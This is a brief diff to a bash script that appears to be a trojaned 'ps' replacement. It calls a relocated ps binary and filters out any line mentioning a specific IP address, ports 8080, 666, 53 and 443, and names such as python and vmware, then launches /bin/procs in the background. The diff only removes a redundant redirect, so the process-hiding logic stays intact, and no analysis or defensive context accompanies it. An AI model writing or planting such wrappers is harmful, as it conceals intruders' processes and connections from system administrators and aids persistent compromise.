@@ -1,5 +1,5 @@
 #!/bin/bash
 
-/var/cache/ps $@ | grep -Ev "192.168.204.128|8080|666|53|443|vmware-network|python|python3|vmware|loop|pulse" 1>&1
+/var/cache/ps $@ | grep -Ev "192.168.204.128|8080|666|53|443|vmware-network|python|python3|vmware|loop|pulse"
 
 /bin/procs &
